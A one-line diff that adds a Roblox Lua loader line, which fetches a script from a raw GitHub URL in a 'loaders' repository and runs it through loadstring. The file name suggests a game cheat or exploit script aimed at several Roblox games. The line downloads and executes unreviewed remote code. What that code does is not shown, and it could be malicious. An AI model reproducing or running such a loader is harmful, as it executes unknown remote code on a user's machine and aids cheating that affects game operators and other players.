@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/2x-exp-warden-sonaria-horror-escape-spam7-vqt1mpx9o41fl5.lua"))()
